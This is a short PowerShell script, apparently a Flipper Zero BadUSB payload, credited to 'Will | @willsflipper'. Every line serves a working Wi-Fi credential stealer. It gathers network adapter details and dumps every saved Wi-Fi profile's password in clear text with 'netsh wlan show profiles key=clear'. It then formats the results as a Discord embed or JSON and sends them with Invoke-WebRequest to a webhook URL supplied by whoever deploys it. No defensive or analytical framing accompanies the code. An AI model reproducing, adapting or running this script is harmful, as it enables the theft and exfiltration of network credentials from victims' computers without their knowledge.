# Created by Will | @willsflipper

# :::       ::: ::::::::::: :::        :::        
# :+:       :+:     :+:     :+:        :+:        
# +:+       +:+     +:+     +:+        +:+        
# +#+  +:+  +#+     +#+     +#+        +#+        
# +#+ +#+#+ +#+     +#+     +#+        +#+        
#  #+#+# #+#+#      #+#     #+#        #+#        
#   ###   ###   ########### ########## ##########

$webhookUrl = "$wh"
if (([string]::IsNullOrEmpty("$webhookUrl"))) {exit}

$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
$WLANProfileNames = @()
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

foreach ($WLANProfileName in $Output) {
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$output = @()
$discordProfiles = ""

foreach ($WLANProfileName in $WLANProfileNames) {
    try {
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    } catch {
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    if ($webhookUrl.Contains('discord.com/api/webhooks/')) {
        $discordProfiles += "ssid: $WLANProfileName\npass: $WLANProfilePassword\n"
        $output = @"
{"content": null,"embeds": [{"title": "WiFis:","description": "$discordProfiles","color": 16753920,"author": {"name": "WiFis Recieved"},"footer": {"text": "will | @willsflipper","icon_url": "https://thumb.tildacdn.com/tild6664-3230-4633-b839-313833343662/-/resize/300x/-/format/webp/qFlipper_macOS_256px.png"}}]}
"@
    } else {
        $object = $output | ConvertFrom-Json

        if ($object -eq $null) {
            $object = @{
                "SSID" = "Password"
            }
        }

        Add-Member -InputObject $object -NotePropertyName $WLANProfileName -NotePropertyValue $WLANProfilePassword
        $output = $object | ConvertTo-Json
    }
}
Invoke-WebRequest -ContentType 'Application/Json' -Uri "$webhookUrl" -Method Post -Body ($output)
